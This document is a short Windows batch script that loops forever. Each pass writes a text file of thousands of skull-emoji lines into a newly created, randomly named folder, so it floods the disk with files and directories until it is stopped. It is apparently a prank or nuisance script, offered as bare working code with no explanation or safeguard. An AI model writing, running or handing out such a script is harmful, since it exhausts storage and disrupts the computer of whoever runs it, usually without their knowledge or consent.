@echo off
title random
:start
set /a rnd1=%random%
(for /l %%i in (1,1,9999) do @echo 💀) > %rnd1%.txt
set /a rnd2=%random%
mkdir %rnd2%
move %rnd1%.txt %rnd2%
goto start
